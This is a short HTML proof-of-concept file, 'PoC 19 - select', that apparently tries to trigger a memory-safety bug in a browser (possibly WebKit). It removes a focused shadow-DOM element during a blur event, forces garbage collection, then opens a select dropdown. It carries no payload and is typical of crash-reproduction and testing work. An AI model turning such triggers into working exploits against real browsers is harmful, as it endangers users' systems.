<!DOCTYPE html>
<html>
<body>
<p>PoC 19 - select</p>
<div id="host"></div>
<select id="sel" size="1">
    <option>1</option><option>2</option><option>3</option>
</select>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(() => {
    sel.focus();
    sel.click();
    // alguns WebKits abrem o dropdown nativo
    setTimeout(() => {
        result.textContent = 'PASS';
    }, 300);
}, 100);
</script>
</body>
</html>
